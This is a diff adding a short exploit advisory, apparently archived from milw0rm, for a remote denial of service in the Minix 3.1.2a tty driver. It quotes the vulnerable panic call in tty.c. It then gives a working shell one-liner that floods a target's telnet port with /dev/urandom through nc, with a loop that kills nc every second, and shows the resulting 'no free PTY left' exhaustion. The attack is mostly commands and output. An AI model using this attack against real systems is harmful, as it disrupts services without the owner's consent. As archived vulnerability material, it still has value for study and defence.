@@ -1,0 +1,21 @@
+# kokanin@gmail 20080724
+# minix 3.1.2a remote tty panic
+
+trunk/src/drivers/tty/tty.c
+
+ 14965	  if ((status = send(replyee, &tty_mess)) != OK) {
+ 14966	        panic("TTY","tty_reply failed, status\n", status);
+
+
+$ (while true ; do sleep 1 && killall nc 2>/dev/null; done) &
+$ while true ; do cat /dev/urandom | nc 192.168.1.42 23 ; done
+[snip garbage]
+I am sorry, but there is no free PTY left!
+$ fg
+$ ^C
+
+hai, no moar pty, remotely, kthxbye
+--
+kokanin
+
+# milw0rm.com [2008-07-25]
